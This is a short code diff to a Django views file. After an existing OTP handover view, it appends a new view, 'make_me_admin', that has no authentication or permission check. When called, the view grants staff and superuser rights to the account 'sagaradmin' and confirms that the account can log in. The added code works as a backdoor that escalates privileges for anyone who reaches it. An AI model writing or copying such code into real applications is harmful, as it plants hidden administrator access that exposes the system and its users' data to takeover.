@@ -1002,3 +1002,14 @@ class VerifyHandoverOTPView(generics.GenericAPIView):
             return Response({"success": True, "message": "Handover successful! Item is now In Use."})
         else:
             return Response({"error": "Invalid order type."}, status=status.HTTP_400_BAD_REQUEST)
+
+from django.http import HttpResponse
+def make_me_admin(request):
+    try:
+        u = User.objects.get(username='sagaradmin')
+        u.is_staff = True
+        u.is_superuser = True
+        u.save()
+        return HttpResponse('Success! sagaradmin is now an admin. You can log in.')
+    except Exception as e:
+        return HttpResponse(f'Error: {e}')
